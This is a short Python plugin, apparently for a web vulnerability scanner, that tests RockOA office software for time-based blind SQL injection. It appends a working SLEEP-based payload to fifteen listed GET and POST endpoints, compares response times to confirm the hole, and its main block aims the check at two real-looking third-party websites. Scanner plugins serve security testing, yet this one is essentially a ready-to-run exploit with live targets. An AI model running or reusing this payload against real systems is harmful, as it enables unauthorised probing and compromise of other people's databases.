#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer： 0day 这么多注入总有一个适合你

import time

def assign(service, arg):
    if service == "rockoa":
        return True, arg 	

def test_inj_get(url):
    payload = "' AND (SELECT * FROM (SELECT(SLEEP(7)))MDqI) AND 'geIm'='geIm"
    verify = url + payload
    time1 = time.time()
    code, head, res, errcode, _ = curl.curl2(url)
    time2 = time.time()
    code, head, res, errcode, _ = curl.curl2(verify)
    time3 = time.time()
    code, head, res, errcode, _ = curl.curl2(url)
    time4 = time.time()
    if abs((time3 - time2) - (time2 - time1)) - abs((time2 - time1) - (time4 - time3))  >= 7:
        return True
    else:
        return False
    
def test_inj_post(url, data):
    payload = "' AND (SELECT * FROM (SELECT(SLEEP(7)))MDqI) AND 'geIm'='geIm"
    verify_data = data + payload
    time1 = time.time()
    code, head, res, errcode, _ = curl.curl2(url=url, post=data)
    time2 = time.time()
    code, head, res, errcode, _ = curl.curl2(url=url, post=verify_data)
    time3 = time.time()
    code, head, res, errcode, _ = curl.curl2(url=url, post=data)
    time4 = time.time()
    if abs((time3 - time2) - (time2 - time1)) - abs((time2 - time1) - (time4 - time3))  >= 6:
        return True
    else:
        return False
        
def audit(arg):
    payloads = [
        'rock.php?a=default&d=webim&m=index&ajaxbool=false&uid=1',
        'rock.php?a=getuserone&d=webim&m=index&ajaxbool=true&sholauid=1',
        'rock.php?a=createlun&d=webim&m=index&ajaxbool=true&aid=1',
        'rock.php?a=check&d=webim&m=login&ajaxbool=true&adminuser=1',
        'rock.php?a=getlist&d=taskrun&m=work&ajaxbool=true|dt=12',
        'rock.php?a=yaoqinguid&d=webim&m=group&ajaxbool=true|val=1',
        'rock.php?a=save&d=webim&m=group&ajaxbool=true|receid=1',
        'rock.php?a=check&d=taskrun&m=flow&ajaxbool=true|flownum=1',
        'rock.php?a=adduser&d=webim&m=guan&ajaxbool=true|val=1&gid=1',
        'rock.php?a=save&d=webim&m=user&ajaxbool=true|receid=122',
        'rock.php?a=fenxi&d=taskrun&m=kaoqin&ajaxbool=true',
        'rock.php?a=default&d=webim&m=index&ajaxbool=false&uid=1',
        'rock.php?a=getuserone&d=webim&m=index&ajaxbool=true&sholauid=1',
        'rock.php?a=data&d=webim&m=record&ajaxbool=true&atype=user',
        'rock.php?a=view&d=taskrun&m=flow&ajaxbool=false&uid=1&mid=1&modenum=1',
    ]
    for payload in payloads:
        url = arg + payload
        if len(payload.split('|')) == 2:
            if test_inj_post(url.split('|')[0], payload.split('|')[1]) == True:
                security_hole(url.split('|')[0] + '(post data ' + payload.split('|')[1] + ')   sql injection!')
                return
        if len(payload.split('|')) == 1:
            if test_inj_get(url) == True:
                security_hole(url + '   sql injection!')
                return
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('rockoa', 'http://www.jingkelai.com/jingkelaioa/')[1])
    audit(assign('rockoa', 'http://www.ihkda.com/hg/')[1])